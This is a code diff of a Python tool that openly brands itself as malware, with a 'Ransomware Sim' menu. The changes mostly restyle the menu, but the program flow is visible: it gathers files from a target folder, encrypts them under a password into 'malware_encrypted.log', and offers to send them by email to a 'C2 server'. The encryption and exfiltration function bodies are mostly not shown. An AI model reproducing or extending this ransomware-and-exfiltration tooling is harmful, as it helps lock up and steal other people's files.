@@ -59,7 +59,6 @@ def encrypt_folder(folder_path, password):
         print(f"[!] Encryption failed: {e}")
         return False
 
-
 # ===== DECRYPTION =====
 def decrypt_file(encrypted_path, password):
     """Decrypt function for recall.py with full path handling"""
@@ -117,6 +116,7 @@ def decrypt_file(encrypted_path, password):
     except Exception as e:
         print(f"\n[!] FATAL ERROR: {str(e)}")
     return False
+
 # ===== EXFILTRATION =====
 def exfiltrate_data():
     """Send encrypted file via email."""
@@ -144,56 +144,76 @@ def exfiltrate_data():
 
 # ===== MAIN MENU =====
 def main():
-    print("""
-    ███╗   ███╗ █████╗ ██╗  ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
-    ████╗ ████║██╔══██╗██║ ██╔╝██║    ██║██╔══██╗██╔══██╗██╔════╝
-    ██╔████╔██║███████║█████╔╝ ██║ █╗ ██║███████║██████╔╝█████╗  
-    ██║╚██╔╝██║██╔══██║██╔═██╗ ██║███╗██║██╔══██║██╔══██╗██╔══╝  
-    ██║ ╚═╝ ██║██║  ██║██║  ██╗╚███╔███╔╝██║  ██║██║  ██║███████╗
-    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+    print(r"""
+    ███╗   ███╗ █████╗ ██╗      ██╗    ██╗ █████╗ ██████╗ ███████╗
+    ████╗ ████║██╔══██╗██║      ██║    ██║██╔══██╗██╔══██╗██╔════╝
+    ██╔████╔██║███████║██║      ██║ █╗ ██║███████║██████╔╝█████╗  
+    ██║╚██╔╝██║██╔══██║██║      ██║███╗██║██╔══██║██╔══██╗██╔══╝  
+    ██║ ╚═╝ ██║██║  ██║███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗
+    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
     """)
+    print("🔥" * 50)
+    print("          W E L C O M E   T O   M O H A Z E M ' S   M A L W A R E")
+    print("🔥" * 50 + "\n")
 
     while True:
-        print("\n[1] Encrypt & Exfiltrate")
-        print("[2] Decrypt")
-        print("[3] Exit")
-        choice = input("\n>>> Choose an option (1/2/3): ").strip()
+        print("\n⚡" * 25)
+        print("           🎮 M A I N   M E N U 🎮")
+        print("⚡" * 25)
+        print("\n[1] 🔒 Encrypt & Exfiltrate (Ransomware Sim)")
+        print("[2] 🔓 Decrypt Files (Whitehat Mode)")
+        print("[3] ☠ Exit Cyber Ops")
+        choice = input("\n>>> OPERATION SELECTION (1/2/3): ").strip()
 
         if choice == '1':
             # Encrypt
-            target_folder = input("\n[?] Enter folder path to encrypt: ").strip()
+            print("\n💣" * 15 + " DEPLOYING MALWARE " + "💣" * 15)
+            target_folder = input("\n[?] 🗂️ Enter TARGET folder path: ").strip()
             if not os.path.exists(target_folder):
-                print("[!] Folder does not exist!")
+                print("\n[!] 🚨 CRITICAL ERROR: Target folder not found!")
+                print("     Possible solutions:")
+                print("     1. Check path spelling")
+                print("     2. Use drag & drop into terminal")
+                print("     3. Verify folder exists\n")
                 continue
 
-            password = input("[?] Set encryption password: ").strip()
-            print("\n[+] Collecting files...")
+            password = input("[?] 🔑 Set ENCRYPTION KEY: ").strip()
+            print("\n[+] 🕵️‍♂️ Collecting intelligence files...")
             collected = collect_files(target_folder, "malware_target")
             
-            print("[+] Encrypting...")
+            print("[+] 🔄 Encrypting with military-grade AES-256...")
             if encrypt_folder(collected, password):
-                print("\n[✔] Folder encrypted as 'malware_encrypted.log'!")
-                if input("[?] Exfiltrate data? (y/n): ").lower() == 'y':
-                    exfiltrate_data()
+                print("\n[✔] 💀 MISSION SUCCESS! All targets encrypted as 'malware_encrypted.log'")
+                if input("[?] ☁️ Exfiltrate to C2 server? (y/n): ").lower() == 'y':
+                    print("\n[+] 🚀 Launching exfiltration protocol...")
+                    if exfiltrate_data():
+                        print("[✔] 📡 Email sent successfully to shadow server!")
+                    else:
+                        print("[!] 📡 Connection failed - storing locally")
 
         elif choice == '2':
             # Decrypt
-            encrypted_file = input("\n[?] Path to 'malware_encrypted.log': ").strip()
+            print("\n🛡️" * 15 + " ACTIVATING COUNTERMEASURES " + "🛡️" * 15)
+            encrypted_file = input("\n[?] 🔍 Path to encrypted payload: ").strip()
             if not os.path.exists(encrypted_file):
-                print("[!] File not found!")
+                print("\n[!] 🚨 ALERT: Encrypted payload not detected!")
+                print("     Scan your system for 'malware_encrypted.log'\n")
                 continue
             
-            password = input("[?] Enter decryption password: ").strip()
-            print("\n[+] Decrypting...")
+            password = input("[?] 🔓 Enter DECRYPTION KEY: ").strip()
+            print("\n[+] 🧠 Decrypting with NSA-approved protocols...")
             if decrypt_file(encrypted_file, password):
-                print("\n[✔] Files decrypted to 'decrypted_files' folder!")
+                print("\n[✔] 🌐 SYSTEM RECOVERED! Files restored to 'decrypted_files'")
+                print("     All hostile payloads neutralized\n")
 
         elif choice == '3':
-            print("\n[+] Exiting...")
+            print("\n" + "🖥️" * 20)
+            print("     OPERATION TERMINATED - STAY VIGILANT AGENT")
+            print("🖥️" * 20 + "\n")
             break
 
         else:
-            print("\n[!] Invalid choice!")
+            print("\n[!] ⚠️ INVALID OPERATION CODE - TRY AGAIN")
 
 if __name__ == "__main__":
     main()
